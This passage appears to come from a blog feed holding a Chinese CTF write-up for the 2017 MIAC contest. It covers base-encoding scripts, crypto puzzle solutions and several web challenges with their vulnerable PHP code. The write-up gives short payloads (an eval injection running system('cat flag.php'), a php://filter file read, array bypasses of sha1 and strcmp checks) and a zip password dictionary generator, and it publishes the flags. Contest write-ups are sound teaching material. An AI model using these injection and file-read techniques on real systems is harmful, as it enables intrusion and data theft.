class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseRandomEncode</span><span class="params">(s, depth=<span class="number">3</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(depth):</span><br><span class="line">        s = random.choice([b64encode, b32encode, b16encode])(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> baseRandomEncode(<span class="string">'hello world!'</span>)  <span class="comment"># test</span></span><br></pre></td></tr></table></figure><h3 id="base64混合解码"><a href="#base64混合解码" class="headerlink" title="base64混合解码"></a>base64混合解码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="comment"># repattern is a self-defining item.</span></span><br><span class="line"><span class="comment"># In CTF games,flag often comes as a printable string containing  '&#123;' and '&#125;'.</span></span><br><span class="line">repattern = <span class="string">"[ -~]*&#123;[ -~]*&#125;[ -~]*|[ -~]*&#125;[ -~]*&#123;[ -~]*"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basefuzzDecode</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> res</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> [b64decode, b32decode, b16decode]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t = f(s)</span><br><span class="line">            <span class="keyword">if</span> re.match(repattern, t):</span><br><span class="line">                res.append(t)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                basefuzzDecode(t)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> basefuzzDecode(baseRandomEncode(<span class="string">'flag&#123;hello ctf!&#125;'</span>))  <span class="comment"># test</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>2017 MIAC移动安全赛</title>
      <link href="/171015MiacWP/"/>
      <url>/171015MiacWP/</url>
      
        <content type="html"><![CDATA[<h2 id="2017-10-14"><a href="#2017-10-14" class="headerlink" title="2017/10/14"></a>2017/10/14</h2><blockquote><p><a href="http://miac.cug.edu.cn/" target="_blank" rel="noopener">http://miac.cug.edu.cn/</a></p><p><a href="http://www.yogeit.com/" target="_blank" rel="noopener">http://www.yogeit.com/</a></p><p><a href="https://www.bdctf.online/" target="_blank" rel="noopener">https://www.bdctf.online/</a></p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="贝斯的一家"><a href="#贝斯的一家" class="headerlink" title="贝斯的一家"></a>贝斯的一家</h4><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>依次base64、base64、base32、base16解码。<br><code>flag{fl4g_1_B4se_i3_V3ry_9ood}</code></p><h4 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h4><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;  ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>aaencode ，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="noopener">在线解混淆</a> 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;flag&#123;aaencode_f14g_h4h4h4&#125;&quot;)</span><br></pre></td></tr></table></figure><h4 id="你猜我像啥"><a href="#你猜我像啥" class="headerlink" title="你猜我像啥"></a>你猜我像啥</h4><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">s=<span class="string">'Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4='</span></span><br><span class="line">b64decode(s.replace(<span class="string">'\n'</span>,<span class="string">''</span>))  </span><br><span class="line"><span class="commentspan></span><br><span class="line"><span class="comment">#摩斯密码的解密(https://morsecode.scphillips.com/translator.html)</span></span><br><span class="line"><span class="comment">#=&gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115</span></span><br><span class="line"><span class="comment">#ASCII码转字符&#125;3_e_0_eutylxrnhl33&#123;ns</span></span><br><span class="line">t=<span class="string">'125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115'</span></span><br><span class="line">tt=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr(int(x)),t.split(<span class="string">'-'</span>)))</span><br><span class="line"><span class="comment">#字符串反转  sn&#123;33lhnrxlytue_0_e_3&#125;</span></span><br><span class="line">rtt=tt[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#栅栏密码的解密synt&#123;u3e3_l0h_ner_x3l&#125;</span></span><br><span class="line"><span class="comment">#凯撒密码解密 flag&#123;h3r3_y0u_are_k3y&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="2017-10-23"><a href="#2017-10-23" class="headerlink" title="2017/10/23"></a>2017/10/23</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB签到"><a href="#WEB签到" class="headerlink" title="WEB签到"></a>WEB签到</h4><blockquote><p>签到，格式bdctf{xxxxx}<br><a href="http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080" target="_blank" rel="noopener">http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'bdctf&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'user'</span>] == $_POST[<span class="string">'pass'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'pass can not be user.'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'user'</span>]) === sha1($_POST[<span class="string">'pass'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对数组进行哈希会返回null，所以传进去两个数组即可。<code>Flag: bdctf{welcomeBDCTF2017}</code></p><p><img src="web-checkin.png" alt=""></p><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><blockquote><p>格式是flag{xxxx}<br><a href="http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080" target="_blank" rel="noopener">http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</span><br></pre></td></tr></table></figure><p>直接执行系统命令，<code>system(&#39;cat flag.php&#39;)</code> 。得到flag为<code>flag{93odcGA47rSRFDG}</code> </p><p><img src="cmd-inject.png" alt=""></p><h4 id="这不仅仅是WEB"><a href="#这不仅仅是WEB" class="headerlink" title="这不仅仅是WEB"></a>这不仅仅是WEB</h4><blockquote><p>格式bdctf{xxxxx}<br><a href="http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080" target="_blank" rel="noopener">http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080</a></p></blockquote><p>存在文件读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">"page"</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $file ) )</span><br><span class="line"><span class="keyword">include</span>( $file );</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">header( <span class="string">'Location:?page=include.php'</span> );</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include.php</span></span><br><span class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p align="center"&gt;</span></span><br><span class="line"><span class="string">&lt;font size="20"&gt;</span></span><br><span class="line"><span class="string">&lt;b&gt;File Include&lt;/b&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p align="center"&gt;&lt;img src="photo.jpg"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;font color="white"&gt;文件格式为文本格式&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问不了惹。</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC签到题"><a href="#MISC签到题" class="headerlink" title="MISC签到题"></a>MISC签到题</h4><blockquote><p><code>R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0=</code></p></blockquote><p>先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为<code>flag{b3bd61023d129f9e39b4a26b98c0f366}</code></p><p><img src="misc-checkin.png" alt=""></p><h4 id="常规杂项"><a href="#常规杂项" class="headerlink" title="常规杂项"></a>常规杂项</h4><p>在文件末尾发现提示<code>Password:Bluedon[0-9]{8}</code>  ，写python脚本生成字典，<code>binwalk -e</code> 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为<code>flag{Aha!_Y0u_9Ot_i7}</code>。</p><p>队友使用了ARCHPR掩码爆破，方便很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">s0 = <span class="string">'Bluedon'</span></span><br><span class="line">p = <span class="string">'0123456789'</span></span><br><span class="line">f = open(<span class="string">'normalpass.txt'</span>, <span class="string">'w+'</span>)</span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(p, p, p, p, p, p, p, p):</span><br><span class="line">    passwd = s0 + <span class="string">''</span>.join(i)</span><br><span class="line">    f.write(passwd)</span><br></pre></td></tr></table></figure><p><img src="cracked.png" alt=""></p><p><img src="normal-misc-flag.png" alt=""></p><h4 id="就在眼前"><a href="#就在眼前" class="headerlink" title="就在眼前"></a>就在眼前</h4><blockquote><p>就在眼前<br>恩，如题。格式BDCTF{xxxxx}</p><p><code>flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF</code></p></blockquote><p>使用了Quoted Printable encode，<a href="http://www.webatic.com/run/convert/qp.php" target="_blank" rel="noopener">在线解码</a> 可知隐藏了flag，让其显示即可。<code>BDCTF{Y0u_4Re_5ucCe5SFul}</code></p><p>队友将文件另存为XML，打开也可见flag。</p><p><img src="qpdecode.png" alt=""><img src="jiuzaiyanqian-flag.png" alt=""></p><hr><h2 id="2017-10-30"><a href="#2017-10-30" class="headerlink" title="2017/10/30"></a>2017/10/30</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><blockquote><p>更大的数，格式bdctf{xxx}<br><a href="http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080" target="_blank" rel="noopener">http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080</a></p></blockquote><p>修改表单长度限制。<code>bdctf{s0m2thing_ju8t_1ik2_thi8}</code></p><h4 id="简单的题"><a href="#简单的题" class="headerlink" title="简单的题"></a>简单的题</h4><blockquote><p>格式flag{xxxx}<br><a href="http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080" target="_blank" rel="noopener">http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"密码不正确！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post一个数组 <code>password[]=</code> 即可。<code>flag{Y0u_4re_G3t_FLAG_452}</code></p><h4 